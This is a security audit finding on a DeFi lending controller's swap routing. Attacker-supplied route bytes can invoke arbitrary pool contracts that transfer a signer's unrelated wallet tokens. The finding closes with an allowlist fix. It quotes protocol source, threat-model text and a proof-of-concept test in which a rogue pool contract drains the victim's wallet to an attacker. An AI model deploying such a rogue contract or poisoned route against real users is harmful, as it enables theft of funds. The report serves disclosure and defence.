### Title
Attacker-crafted `swap` route bytes invoke arbitrary pool contracts that pull the caller's wallet funds under the caller's own auth tree - ([File: contracts/controller/src/strategies/swap.rs](contracts/controller/src/strategies/swap.rs))

### Summary
The injection class — user-controlled input reaching a privileged execution sink without validation — maps onto the controller's router-strategy paths. `swap_collateral`, `multiply`, `swap_debt`, `repay_debt_with_collateral`, and `flash_position` forward caller-supplied `StrategySwap` bytes opaquely to the swap aggregator, which `invoke_contract`s whatever `pool` and token addresses the payload names. Because these calls sit below the caller's `require_auth` invocation, a rogue "pool" in the route can call `token.transfer(caller, attacker, x)` on any unrelated wallet token; the host records it as a child of the caller's signed auth entry and executes it if the caller signs the simulated tree. The protocol's own threat model and harness confirm this drains wallet balances far beyond the routed amount.

### Finding Description
`process_swap_collateral` authenticates only `caller` via `require_authorized_caller` and `require_owner_or_delegate`, then forwards the raw `swap: &StrategySwap` payload into `withdraw_and_swap_from_supply` without parsing it [1](#0-0) . `swap_tokens` forwards those bytes verbatim to `router.execute_strategy` — the only on-chain protections are balance deltas (`RouterOverspend`, `NoSwapOutput`) and one exact input-transfer authorization; nothing bounds which contracts the route reaches [2](#0-1) . The aggregator keeps no venue/pool allowlist: `dispatch_hop` invokes `ctx.hop.pool` straight from the payload, so arbitrary code runs mid-transaction under the caller's auth subtree (Phoenix adapter shown; all venues behave the same) [3](#0-2) . The repo's own test demonstrates the primitive end to end: a `RogueHopPool` invoked as a route hop calls `transfer(victim_wallet_token → attacker)` and simulation records the theft as a child of the caller's `swap_collateral` auth entry; after signing, Alice's unrelated token balance goes to zero while the swap still succeeds and passes all risk gates [4](#0-3) [5](#0-4) . The threat model acknowledges the exposure explicitly: "a route can put third-party code on the call stack below the caller's authorization… The loss is then the caller's wallet, not the routed amount" [6](#0-5) .

### Impact Explanation
Theft of user funds. A victim executing any route-bearing controller verb with a poisoned payload loses arbitrary balances of any token in their wallet — capped only by what they hold — with no relation to the swap's `min_out`, the router's `SlippageExceeded` check, or the controller's risk gates. Any address that ever calls a routed strategy while holding other assets is exposed.

### Likelihood Explanation
Medium. Exploitation requires inducing the victim to sign an envelope whose auth tree contains the malicious child invocation — i.e., a phishing/malicious-frontend scenario or an inattentive signer; an honest client that decodes `routeXdr` and inspects the simulated auth tree detects and rejects it, as the threat model prescribes. No privileged role is needed on the attacker's side: the rogue pool is a self-deployed contract and the route is ordinary user input. Exposure is reduced because wallet theft is visible in simulation output, but the protocol ships no on-chain venue allowlist, so the mitigation rests entirely on client behavior.

### Recommendation
Maintain an owner-governed allowlist of pool/share-token addresses (or venue→pool attestations) in the swap aggregator and reject payloads referencing unlisted addresses, so route bytes cannot introduce arbitrary contract code under the caller's auth. Until then, enforce the documented client-side invariant in the SDK: decode `routeXdr`, compare the simulated auth tree against the expected shape, and refuse envelopes with unexpected child invocations.

### Proof of Concept
`tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` is a working PoC: a router double and `RogueHopPool` contract are registered, a `RoutedSwap` payload names the rogue pool as `hop_pool`, and `try_swap_collateral` is invoked for Alice. In recording mode the resulting auth tree shows Alice's `swap_collateral` entry carrying a child `transfer(alice → attacker, WALLET_BALANCE)` on an unrelated token; after the call, `wallet(alice) == 0`, `wallet(attacker) == WALLET_BALANCE`, and the swap itself completes normally [7](#0-6) . The same primitive applies to `execute_strategy` called directly by a user and to `multiply`/`swap_debt`/`repay_debt_with_collateral`, which share the `swap_tokens` plumbing [8](#0-7) .

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-60)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
```

**File:** contracts/controller/src/strategies/swap.rs (L33-54)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/swap-aggregator/src/venues/phoenix.rs (L22-26)
```rust
    ctx.authorize_pool_pull();
    let _: i128 = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-72)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L195-227)
```rust
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```
